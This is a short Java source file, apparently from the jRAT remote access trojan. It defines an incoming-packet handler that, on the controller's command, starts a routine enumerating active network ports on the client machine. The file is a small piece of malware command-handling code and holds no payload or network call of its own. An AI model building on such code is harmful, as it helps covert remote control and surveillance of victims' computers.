package jrat.client.packets.incoming;

import jrat.client.ActivePorts;
import jrat.client.Connection;

public class Packet73ActivePorts implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new ActivePorts(con).start();
	}

}
